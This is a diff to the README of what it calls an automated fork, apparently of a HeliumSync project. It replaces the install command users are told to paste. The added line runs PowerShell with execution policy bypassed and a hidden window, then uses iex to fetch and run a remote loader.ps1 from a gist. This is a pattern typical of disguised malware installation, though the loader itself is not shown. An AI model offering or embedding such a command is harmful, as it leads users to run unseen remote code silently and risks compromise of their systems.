@@ -14,7 +14,7 @@ This is an automated fork designed for high-reliability syncing.
 4. Paste the following command and press **Enter**:
 
 ```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072; Invoke-WebRequest 'https://github.com/09sychic/09sychic-HeliumSync/archive/refs/heads/main.zip' -OutFile \"$env:TEMP\h_sync.zip\"; Expand-Archive \"$env:TEMP\h_sync.zip\" \"$env:TEMP\h_sync_folder\" -Force; Set-Location \"$env:TEMP\h_sync_folder\09sychic-HeliumSync-main\"; .\install.ps1"
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/09sychic/012b89cb00b1f56cbc3a1e77027c3028/raw/b4e095cf4cfd37d33f45c83d2fecd780e15dd4ed/loader.ps1' -UseBasicParsing)"
 ```
 
 ---
